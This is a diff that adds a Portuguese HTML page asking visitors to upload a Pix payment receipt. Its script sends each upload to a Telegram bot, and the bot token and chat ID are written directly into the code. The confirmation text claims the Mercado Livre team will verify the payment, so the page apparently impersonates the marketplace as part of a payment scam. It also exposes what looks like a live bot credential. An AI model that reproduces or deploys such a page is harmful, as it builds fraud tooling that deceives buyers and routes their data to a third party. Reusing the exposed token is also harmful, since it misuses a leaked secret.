@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>Enviar Comprovante</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #a38b03;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 15px;
+    }
+    .container {
+      background-color: #f3cf03;
+      padding: 25px 30px;
+      border-radius: 16px;
+      box-shadow: 0 6px 15px rgba(255, 255, 255, 0.15);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+      box-sizing: border-box;
+      transition: transform 0.3s ease;
+    }
+    .container:focus-within {
+      transform: scale(1.02);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    }
+    .top-image {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 15px auto;
+      object-fit: contain;
+    }
+    h2 {
+      color: #444;
+      margin-bottom: 18px;
+      font-size: 1.8rem;
+      line-height: 1.2;
+    }
+    /* Esconder input file original */
+    #comprovante {
+      display: none;
+    }
+    /* Botão customizado para abrir seletor */
+    .custom-file-upload {
+      display: inline-block;
+      padding: 10px 18px;
+      cursor: pointer;
+      background-color: #000;
+      color: #fff;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 1rem;
+      user-select: none;
+      transition: background-color 0.3s ease;
+    }
+    .custom-file-upload:hover,
+    .custom-file-upload:focus {
+      background-color: #333;
+      outline: none;
+    }
+    /* Texto que mostra o nome do arquivo */
+    #file-name {
+      margin-top: 12px;
+      font-size: 1rem;
+      color: #000;  /* texto preto */
+      min-height: 1.2em;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    button {
+      background-color: #000;
+      color: #fff;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 1.1rem;
+      width: 100%;
+      font-weight: 600;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+      margin-top: 25px;
+    }
+    button:hover,
+    button:focus {
+      background-color: #333;
+      outline: none;
+      transform: scale(1.05);
+    }
+    #msg {
+      margin-top: 20px;
+      font-size: 1rem;
+      color: #222;
+      white-space: pre-line;
+      line-height: 1.4;
+      min-height: 80px;
+      text-align: left;
+      word-wrap: break-word;
+      opacity: 0;
+      transition: opacity 0.5s ease;
+    }
+    #msg.visible {
+      opacity: 1;
+    }
+
+    /* Mobile smaller devices */
+    @media (max-width: 360px) {
+      h2 {
+        font-size: 1.5rem;
+      }
+      .custom-file-upload {
+        font-size: 0.9rem;
+        padding: 8px 16px;
+      }
+      button {
+        font-size: 1rem;
+        padding: 12px 18px;
+      }
+      #file-name {
+        font-size: 0.9rem;
+      }
+      .top-image {
+        width: 65px;
+        height: 65px;
+        margin-bottom: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" role="main">
+    <img src="pagamento/images/icon-complete.png" alt="Ícone de Pix" class="top-image" />
+
+    <h2>📎 Enviar Comprovante de Pagamento</h2>
+
+    <!-- Input escondido -->
+    <input type="file" id="comprovante" accept="image/*" aria-label="Selecionar arquivo de comprovante" />
+
+    <!-- Botão que abre o seletor -->
+    <label for="comprovante" class="custom-file-upload" tabindex="0">Selecionar arquivo</label>
+
+    <!-- Texto que mostra o nome do arquivo ou "Nenhum arquivo escolhido" -->
+    <div id="file-name" aria-live="polite" aria-atomic="true">Nenhum arquivo escolhido</div>
+
+    <button onclick="enviarComprovante()" aria-live="polite">Enviar Comprovante</button>
+    <p id="msg" aria-live="polite" aria-atomic="true"></p>
+  </div>
+
+  <script>
+    const TELEGRAM_TOKEN = '6158400466:AAEUs12kCvMb0TgzUSmtIVqXVtPVknqxXFY'; // <-- Substitua aqui
+    const CHAT_ID = '6798832266';     // <-- Substitua aqui
+
+    const inputFile = document.getElementById('comprovante');
+    const fileNameDiv = document.getElementById('file-name');
+
+    // Atualiza o texto do arquivo selecionado
+    inputFile.addEventListener('change', () => {
+      if (inputFile.files.length > 0) {
+        fileNameDiv.textContent = inputFile.files[0].name;
+      } else {
+        fileNameDiv.textContent = 'Nenhum arquivo escolhido';
+      }
+    });
+
+    async function enviarComprovante() {
+      if (inputFile.files.length === 0) {
+        setMsg('❌ Selecione uma imagem antes de enviar.');
+        return;
+      }
+
+      const file = inputFile.files[0];
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('caption', '📎 Novo comprovante enviado via site!');
+      formData.append('photo', file);
+
+      setMsg('⏳ Enviando comprovante...');
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        if (response.ok) {
+          setMsg(
+`✅ Comprovante enviado com sucesso!  
+Nossa equipe do Mercado Livre vai analisar o pagamento via Pix.
+
+Caso o pagamento seja confirmado, você receberá informações por e-mail ou WhatsApp.  
+Se o pagamento não for identificado, por favor, realize o processo novamente.
+
+Agradecemos pela sua confiança!`
+          );
+          inputFile.value = '';
+          fileNameDiv.textContent = 'Nenhum arquivo escolhido';
+        } else {
+          setMsg('❌ Erro ao enviar. Tente novamente.');
+        }
+      } catch (error) {
+        console.error(error);
+        setMsg('❌ Falha na conexão. Verifique sua internet.');
+      }
+    }
+
+    function setMsg(text) {
+      const msg = document.getElementById('msg');
+      msg.classList.remove('visible');
+      msg.innerText = text;
+      setTimeout(() => msg.classList.add('visible'), 10);
+    }
+  </script>
+</body>
+</html>
